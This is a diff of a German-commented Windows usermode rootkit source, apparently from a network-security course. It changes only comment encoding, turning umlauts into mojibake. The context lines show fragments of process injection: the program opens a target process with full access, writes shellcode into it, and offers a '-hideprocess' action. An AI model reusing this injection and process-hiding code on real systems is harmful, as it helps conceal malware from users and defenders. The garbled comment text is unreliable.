@@ -246,7 +246,7 @@ Arguments:
 		Name des Zielprozesses.
 
 	PDWORD outProcessId:
-		Zeiger der die PID des Zielprozesses erhält.
+		Zeiger der die PID des Zielprozesses erhï¿½lt.
 
 Return Value:
 
@@ -264,11 +264,11 @@ Return Value:
 
 	if (!g_NtGetNextProcess)
 	{
-		//1. Dynamisch die Startaddresse von NtGetNextProcess auflösen.
+		//1. Dynamisch die Startaddresse von NtGetNextProcess auflï¿½sen.
 
 		ntdllHandle = GetModuleHandleW(L"ntdll");
 
-		//Sollte unter keinen Umständen scheitern.
+		//Sollte unter keinen Umstï¿½nden scheitern.
 		if (!ntdllHandle)
 		{
 			retVal = STATUS_UNSUCCESSFUL;
@@ -331,18 +331,18 @@ Routine Description:
 Arguments:
 
 	SHELLCODE_ACTION action:
-		Die Aktion, die der Shellcode im Zielprozess durchführen soll.
+		Die Aktion, die der Shellcode im Zielprozess durchfï¿½hren soll.
 
 	DWORD targetProcess:
 		Prozess-ID des Zielprozesses.
 
 	PVOID data:
-		Aktionsspezifische Daten, die an den Shellcode übergeben werden.
+		Aktionsspezifische Daten, die an den Shellcode ï¿½bergeben werden.
 
 Return Value:
 
-	STATUS_INVALID_PARAMETER: Ungültige Prozess-ID.
-	STATUS_NO_MEMORY: Belegung von Speicherplatz im Zielprozess ist nicht möglich.
+	STATUS_INVALID_PARAMETER: Ungï¿½ltige Prozess-ID.
+	STATUS_NO_MEMORY: Belegung von Speicherplatz im Zielprozess ist nicht mï¿½glich.
 	STATUS_INVALID_ADDRESS: Es konnte nicht in den Zielprozess geschrieben werden.
 	STATUS_SUCCESS: Wenn erfolgreich.
 
@@ -355,7 +355,7 @@ Return Value:
 	SIZE_T bytesWritten;
 	BOOL success;
 
-	//1. Öffnen des Zielprozesses
+	//1. ï¿½ffnen des Zielprozesses
 
 	processHandle = OpenProcess(
 		PROCESS_ALL_ACCESS,
@@ -416,7 +416,7 @@ Return Value:
 		shellcodeData.HiddenProcessId = *((PDWORD)data);
 	}
 
-	//Kernelbase und Ntdll gehören zu den "KnownDLLs". 
+	//Kernelbase und Ntdll gehï¿½ren zu den "KnownDLLs". 
 	//Dies garantiert, dass diese Module in allen Prozessen 
 	//trotz ASLR die gleiche Basisaddresse haben.
 
@@ -502,7 +502,7 @@ int WinMain(
 
 	SetConsoleTitleW(L"Netzwerksicherheit Usermode-Rootkit");
 
-	//2. Überprüfung auf Admin-Berechtigungen
+	//2. ï¿½berprï¿½fung auf Admin-Berechtigungen
 
 	if (!IsUserAnAdmin())
 	{
@@ -531,7 +531,7 @@ int WinMain(
 		goto Done;
 	}
 
-	//4. Gewünschte Aktion ausführen.
+	//4. Gewï¿½nschte Aktion ausfï¿½hren.
 
 	if (!wcscmp(argArray[1], L"-hideprocess"))
 	{
